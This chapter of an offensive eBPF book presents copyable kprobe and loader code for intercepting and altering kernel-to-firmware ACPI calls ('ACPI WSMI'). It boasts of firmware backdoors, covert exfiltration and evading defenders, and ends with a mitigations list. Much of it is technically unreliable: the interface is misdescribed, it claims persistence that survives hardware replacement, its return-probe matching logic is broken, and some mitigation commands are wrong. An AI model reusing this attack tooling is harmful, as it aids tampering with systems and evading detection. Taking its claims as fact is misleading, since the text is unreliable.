# ACPI WSMI Ping: Subverting Hardware Management Interfaces

**Chapter 17: Talking Directly to the Hardware**

You've learned to hop between thread contexts to bypass seccomp. Now, for the penultimate chapter of our story, let's go even deeper—all the way down to the hardware management layer itself.

This is where our story reaches its technical climax. You've manipulated software, controlled hardware power, and even subverted cryptographic verification. But what if you could communicate directly with the system firmware? What if you could bypass not just the kernel, but the entire operating system layer?

ACPI WSMI represents the deepest level of system access—the interface between the operating system and the system firmware. It's how the OS talks to the hardware management controller, how it communicates with the BIOS/UEFI, how it accesses the most privileged parts of the system.

We're going to hijack this communication channel. While everyone else is focused on userspace and kernel-space attacks, we're going to operate at the firmware level—the level below the kernel itself.

This is where you learn that eBPF doesn't just give you kernel-level access—it gives you access to the very foundations of the system, the firmware layer that even the kernel depends on.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[eBPF Program] -->|1. Hook ACPI Call| B[ACPI WSMI Interface]
    B -->|2. Privileged Access| C[Hardware Management]
    C -->|3. Execute Commands| D[System Management Mode]
    D -->|4. Bypass Kernel Controls| E[Hardware Control]
    E -->|5. Persistence/Exfiltration| F[Attacker Infrastructure]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/firmware-guide/acpi/index.html" "ACPI Documentation"
    click C "https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/index.html" "Hardware Vulnerabilities"
    click D "https://www.kernel.org/doc/html/latest/firmware-guide/acpi/dsd/index.html" "Device Properties"
```



**Why**

Because eBPF + misconfiguration => broken isolation. The ACPI WSMI interface provides a direct communication channel to hardware that bypasses many security controls. When combined with eBPF's ability to hook into kernel functions, this creates a powerful attack vector that can be difficult to detect and mitigate.

## Technical Details

### ACPI WSMI Interface Overview

ACPI (Advanced Configuration and Power Interface) WSMI (Windows System Management Interface) is basically the kernel's hotline to the firmware. It's how the OS talks to the BIOS and hardware components. Even though it was originally designed for Windows, Linux systems have it too for hardware compatibility.

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Applications  │      │ System        │                   │
│  │               │      │ Services      │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ ACPI Driver   │                                          │
│  │               │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ ACPI Methods  │                                          │
│  │ (AML)         │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
└──────────┼──────────────────────────────────────────────────┘
           │
┌──────────▼──────────────────────────────────────────────────┐
│                      Firmware                               │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ ACPI BIOS     │      │ System        │                   │
│  │               │      │ Management    │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Hardware                   │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we use eBPF to intercept ACPI communications:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Applications  │      │ System        │                   │
│  │               │      │ Services      │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ ACPI Driver   │◀─────┐                                   │
│  │               │      │                                   │
│  └───────┬───────┘      │                                   │
│          │              │                                   │
│  ┌───────┴───────┐      │                                   │
│  │ eBPF Program  │──────┘                                   │
│  └───────────────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ ACPI Methods  │                                          │
│  │ (AML)         │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
└──────────┼──────────────────────────────────────────────────┘
           │
┌──────────▼──────────────────────────────────────────────────┐
│                      Firmware                               │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ ACPI BIOS     │      │ System        │                   │
│  │               │      │ Management    │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Hardware                   │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### How We Tap the Firmware Hotline

Our strategy is to intercept and manipulate the kernel's communications with the firmware:

1. **Wiretap the Hotline**: We hook into [`acpi_evaluate_object()`](https://elixir.bootlin.com/linux/latest/source/drivers/acpi/acpica/nseval.c) and related functions that talk to the firmware
2. **Modify the Messages**: We change parameters of legitimate calls or inject entirely new firmware commands
3. **Bypass the Security Guards**: We execute privileged operations that would normally be restricted to system firmware
4. **Plant Persistent Backdoors**: We modify firmware settings that survive OS reinstallation and even hardware replacement

The scary part is that this gives us access to the deepest level of the system—the firmware itself. We can modify hardware behavior, create persistent backdoors, and even brick systems if we want to.

### Building Our Firmware Manipulation Tool

```c
// @interactive: true
// @copyable: true
// ACPI WSMI Ping - eBPF exploitation proof of concept
// This demonstrates manipulating ACPI interfaces for hardware-level access

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/acpi.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_ACPI_PATH_LEN 64
#define MAX_ACPI_DATA_LEN 256
#define MAX_COMM_LEN 16

// Structure to track ACPI events
struct acpi_event {
    u32 pid;                // Process ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    u8 method[MAX_ACPI_PATH_LEN]; // ACPI method name
    u32 param_count;        // Number of parameters
    u32 intercepted;        // Whether the call was intercepted
    u32 modified;           // Whether parameters were modified
};

// Structure to store ACPI method parameters
struct acpi_param {
    u32 type;               // Parameter type
    u8 data[MAX_ACPI_DATA_LEN]; // Parameter data
    u32 data_len;           // Data length
};

// Map to store target ACPI methods we want to intercept
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, MAX_ACPI_PATH_LEN);  // Method name as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, 64);
} target_methods SEC(".maps");

// Map to store replacement parameters
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, MAX_ACPI_PATH_LEN);  // Method name as key
    __uint(value_size, sizeof(struct acpi_param)); // Replacement parameter
    __uint(max_entries, 64);
} replacement_params SEC(".maps");

// Map to store original parameters for restoration
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, u64);  // Unique call ID (pid + timestamp)
    __uint(value_size, sizeof(struct acpi_param)); // Original parameter
    __uint(max_entries, 64);
} original_params SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if an ACPI method is one we want to intercept
static __always_inline bool is_target_method(const char *method_name) {
    // Check if this method is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_methods, method_name);
    if (target && *target == 1)
        return true;
    
    // Hardcoded checks for common WSMI methods
    // This is a simplified approach - real implementation would be more sophisticated
    if (method_name[0] == '_' && method_name[1] == 'W' && 
        method_name[2] == 'S' && method_name[3] == 'M' && 
        method_name[4] == 'I')
        return true;
    
    return false;
}

// Hook the ACPI method evaluation function
SEC("kprobe/acpi_evaluate_object")
int BPF_KPROBE(hook_acpi_evaluate, acpi_handle handle, acpi_string pathname,
               struct acpi_object_list *parameters, struct acpi_buffer *return_buffer)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is an ACPI method we want to intercept
    if (pathname && is_target_method(pathname)) {
        // Log the event
        struct acpi_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        bpf_probe_read_str(event.method, sizeof(event.method), pathname);
        event.intercepted = 1;
        
        // Check if we have parameters to modify
        if (parameters && parameters->count > 0) {
            event.param_count = parameters->count;
            
            // In a real exploit, we would now:
            // 1. Store original parameters
            // 2. Replace with malicious parameters
            
            // For demonstration, we'll just log that we would modify parameters
            struct acpi_param *replacement = bpf_map_lookup_elem(&replacement_params, pathname);
            if (replacement) {
                event.modified = 1;
                
                // Store a unique call ID for this interception
                u64 call_id = ((u64)pid << 32) | (event.timestamp & 0xFFFFFFFF);
                
                // Store original parameters for restoration
                struct acpi_param original = {};
                original.type = 0; // Would be actual parameter type in real exploit
                
                bpf_map_update_elem(&original_params, &call_id, &original, BPF_ANY);
                
                // In a real exploit, we would modify the parameters here
                // This is simplified for demonstration
                // struct acpi_object *obj = parameters->pointer;
                // bpf_probe_write_user(&obj->string.pointer, replacement->data, replacement->data_len);
            }
        }
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// Hook the return from ACPI method evaluation to capture results
SEC("kretprobe/acpi_evaluate_object")
int BPF_KRETPROBE(hook_acpi_evaluate_ret, acpi_status return_value)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u64 timestamp = bpf_ktime_get_ns();
    
    // Create a unique call ID that matches the one used in the kprobe
    u64 call_id = ((u64)pid << 32) | ((timestamp - 1000) & 0xFFFFFFFF);
    
    // Check if we need to restore parameters for this call
    struct acpi_param *original = bpf_map_lookup_elem(&original_params, &call_id);
    if (original) {
        // In a real exploit, we would restore original parameters here
        // This is simplified for demonstration
        
        // Log the event
        struct acpi_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = timestamp;
        event.intercepted = 2; // 2 = return intercepted
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Clean up
        bpf_map_delete_elem(&original_params, &call_id);
    }
    
    return 0;
}

// Hook the ACPI table access function to intercept firmware interactions
SEC("kprobe/acpi_get_table_with_size")
int BPF_KPROBE(hook_acpi_table, char *signature, u32 instance,
               struct acpi_table_header **out_table, u32 *tbl_size)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a table access we want to intercept
    if (signature) {
        char sig[5] = {0};
        bpf_probe_read_str(sig, sizeof(sig), signature);
        
        // Check for interesting ACPI tables (DSDT, SSDT, etc.)
        if ((sig[0] == 'D' && sig[1] == 'S' && sig[2] == 'D' && sig[3] == 'T') ||
            (sig[0] == 'S' && sig[1] == 'S' && sig[2] == 'D' && sig[3] == 'T') ||
            (sig[0] == 'W' && sig[1] == 'S' && sig[2] == 'M' && sig[3] == 'I')) {
            
            // Log the event
            struct acpi_event event = {};
            event.pid = pid;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.timestamp = bpf_ktime_get_ns();
            bpf_probe_read_str(event.method, sizeof(event.method), sig);
            event.intercepted = 3; // 3 = table access
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
            
            // In a real exploit, we might modify the table pointer or size
            // This is simplified for demonstration
        }
    }
    
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the ACPI WSMI Ping eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "acpi_wsmi_ping.skel.h"

static volatile bool exiting = false;

// Structure for ACPI events (must match the BPF version)
struct acpi_event {
    uint32_t pid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint8_t method[64];
    uint32_t param_count;
    uint32_t intercepted;
    uint32_t modified;
};

// Structure for ACPI parameters (must match the BPF version)
struct acpi_param {
    uint32_t type;
    uint8_t data[256];
    uint32_t data_len;
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct acpi_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s): ", timestamp, e->pid, e->comm);
    
    if (e->intercepted == 1) {
        printf("Intercepted ACPI method call: %s\n", e->method);
        if (e->param_count > 0) {
            printf("  Parameters: %d\n", e->param_count);
            if (e->modified) {
                printf("  Action: Parameters modified for malicious purposes\n");
            }
        }
    } else if (e->intercepted == 2) {
        printf("Intercepted ACPI method return\n");
    } else if (e->intercepted == 3) {
        printf("Intercepted ACPI table access: %s\n", e->method);
    }
    
    printf("\n");
}

// Add an ACPI method to the target list
void add_target_method(int map_fd, const char *method)
{
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, method, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target method: %s\n", strerror(errno));
    } else {
        printf("Added ACPI method '%s' to target list\n", method);
    }
}

// Add a replacement parameter for an ACPI method
void add_replacement_param(int map_fd, const char *method, uint32_t type, 
                          const char *data, uint32_t data_len)
{
    struct acpi_param param = {
        .type = type,
        .data_len = data_len
    };
    
    if (data_len > sizeof(param.data)) {
        data_len = sizeof(param.data);
    }
    
    memcpy(param.data, data, data_len);
    
    if (bpf_map_update_elem(map_fd, method, &param, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add replacement parameter: %s\n", strerror(errno));
    } else {
        printf("Added replacement parameter for ACPI method '%s'\n", method);
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -m METHOD  Add ACPI method to target list\n");
    printf("  -p METHOD:TYPE:DATA  Add replacement parameter\n");
    printf("  -h         Show this help\n");
}

int main(int argc, char **argv)
{
    struct acpi_wsmi_ping_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err, opt;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "m:p:h")) != -1) {
        switch (opt) {
            case 'm':
            case 'p':
                // We'll process these after loading the program
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = acpi_wsmi_ping_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = acpi_wsmi_ping_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Process command line arguments
    optind = 1;  // Reset getopt
    while ((opt = getopt(argc, argv, "m:p:h")) != -1) {
        switch (opt) {
            case 'm':
                add_target_method(bpf_map__fd(skel->maps.target_methods), optarg);
                break;
            case 'p': {
                char *method = strtok(optarg, ":");
                char *type_str = strtok(NULL, ":");
                char *data = strtok(NULL, "");
                
                if (method && type_str && data) {
                    uint32_t type = atoi(type_str);
                    add_replacement_param(bpf_map__fd(skel->maps.replacement_params),
                                         method, type, data, strlen(data) + 1);
                } else {
                    fprintf(stderr, "Invalid parameter format. Use METHOD:TYPE:DATA\n");
                }
                break;
            }
        }
    }

    // Add some default targets if none specified
    int target_map_fd = bpf_map__fd(skel->maps.target_methods);
    int count = 0;
    char method_name[64];
    uint8_t dummy;
    
    // Check if we have any targets
    if (bpf_map_get_next_key(target_map_fd, NULL, &method_name) != 0) {
        // Add default targets
        add_target_method(target_map_fd, "_WSMI");
        add_target_method(target_map_fd, "_WSMX");
        add_target_method(target_map_fd, "WSMI");
        add_target_method(target_map_fd, "WSMX");
    }

    printf("ACPI WSMI Ping eBPF program loaded and running.\n");
    printf("Monitoring for ACPI method calls...\n");
    printf("Press Ctrl+C to exit.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    acpi_wsmi_ping_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Restrict ACPI Table Access**:
   ```bash
   # Use kernel parameters to restrict ACPI functionality
   acpi=off          # Disable ACPI completely (extreme)
   acpi=noirq        # Disable ACPI IRQ routing
   pnpacpi=off       # Disable PnP ACPI
   
   # Use seccomp to restrict access to ACPI-related syscalls
   seccomp-tools dump -p <pid>
   ```

4. **Firmware Security**:
   ```bash
   # Update firmware to latest version with security patches
   fwupdmgr get-devices
   fwupdmgr refresh
   fwupdmgr update
   
   # Use UEFI Secure Boot
   mokutil --enable-validation
   ```

### Why This Owns the Hardware

This ACPI WSMI ping technique is pure hardware domination:
- **Immortal hardware backdoors**: Establish backdoors that survive OS reinstallation, disk wipes, and even hardware replacement
- **Firmware takeover**: Alter system firmware to maintain long-term control at the deepest possible level
- **Cross-OS supremacy**: Execute attacks that work regardless of the operating system - Windows, Linux, doesn't fucking matter
- **Hardware covert channels**: Create data exfiltration channels through hardware interfaces that bypass all software monitoring
- **Ultimate security bypass**: Circumvent OS-level security controls by operating at the hardware level where they can't reach

When you can interact directly with hardware management interfaces, you've essentially broken out of the software prison entirely. Cloud providers, data centers, enterprise environments - their physical hardware becomes your playground. You're operating below the OS, below the hypervisor, in the realm where security tools can't even see you.

### How They'll Try to Catch Us

Smart defenders will be hunting for our hardware manipulation:
- **eBPF surveillance**: Watching for eBPF programs hooking ACPI-related functions
- **ACPI anomaly detection**: Looking for unusual patterns of ACPI method calls
- **Hardware behavior monitoring**: Tracking discrepancies between expected and actual hardware behavior
- **Firmware integrity checks**: Monitoring for unexpected firmware or SMM (System Management Mode) activity

But here's the ultimate advantage - we're operating at the hardware level, below where most security tools can monitor. By the time they detect hardware anomalies, we've already established persistent access that can survive complete system rebuilds.

## POC

Companion code: [`ch17-acpi-wsmi`]({{ site.baseurl }}/dBPF-pocs/pocs/ch17-acpi-wsmi/)